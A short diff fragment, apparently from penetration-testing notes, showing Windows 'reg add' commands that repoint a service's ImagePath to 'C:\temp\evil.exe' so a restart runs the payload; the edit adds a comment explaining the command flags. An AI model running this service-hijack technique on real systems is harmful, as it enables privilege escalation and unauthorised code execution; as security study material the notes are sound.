@@ -11,7 +11,7 @@ reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
 # change image path
 reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
 
-# or use following command
+# or use following command (/t: type, /v:value or name of entry, /f: add without prompting for confirmation, /d: data)
 reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /t REG_EXPAND_SZ /v ImagePath /d "C:\temp\evil.exe" /f
 
 # restart the service and the custom payload will be executed instead of the service binary and it will 
